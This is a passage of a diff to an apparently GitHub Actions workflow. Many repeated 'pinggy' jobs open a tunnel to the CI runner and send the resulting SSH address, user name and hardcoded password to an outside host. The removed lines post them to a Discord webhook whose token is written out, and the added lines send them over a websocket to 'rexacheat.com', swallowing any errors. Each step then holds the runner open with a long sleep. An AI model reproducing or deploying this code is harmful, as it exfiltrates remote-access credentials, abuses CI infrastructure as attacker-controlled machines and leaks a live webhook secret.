-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 6
         run: |
@@ -1420,7 +1969,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 7
         run: |
@@ -1442,7 +2000,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
 
   pinggy-10:
@@ -1470,7 +2037,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 2
         run: |
@@ -1492,7 +2068,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 3
         run: |
@@ -1514,7 +2099,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 4
         run: |
@@ -1536,7 +2130,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 5
         run: |
@@ -1558,7 +2161,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 6
         run: |
@@ -1580,7 +2192,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 7
         run: |
@@ -1602,7 +2223,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
 
   pinggy-11:
@@ -1630,7 +2260,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 2
         run: |
@@ -1652,7 +2291,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 3
         run: |
@@ -1674,7 +2322,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 4
         run: |
@@ -1696,7 +2353,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 5
         run: |
@@ -1718,7 +2384,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 6
         run: |
@@ -1740,7 +2415,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 7
         run: |
@@ -1762,7 +2446,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
 
   pinggy-12:
@@ -1790,7 +2483,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 2
         run: |
@@ -1812,7 +2514,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 3
         run: |
@@ -1834,7 +2545,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 4
         run: |
@@ -1856,7 +2576,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 5
         run: |
@@ -1878,7 +2607,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 6
         run: |
@@ -1900,7 +2638,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 7
         run: |
@@ -1922,7 +2669,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
 
   pinggy-13:
@@ -1950,7 +2706,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 2
         run: |
@@ -1972,7 +2737,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 3
         run: |
@@ -1994,7 +2768,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 4
         run: |
@@ -2016,7 +2799,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 5
         run: |
@@ -2038,7 +2830,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 6
         run: |
@@ -2060,7 +2861,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
-          curl -s -H "Content-Type: application/json" -X POST -d "{\"content\":\"SSH: $CLEAN\nUser: runner\nPass: Venom123!\"}" "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" || true
+          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
+          python3 - <<EOF
+          import asyncio, websockets, json
+          async def s():
+              try:
+                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
+                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
+              except: pass
+          asyncio.run(s())
+          EOF
           sleep 3000
       - name: FULL SETUP 7
         run: |
@@ -2082,7 +2892,16 @@ jobs:
           sleep 15
           LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
           CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
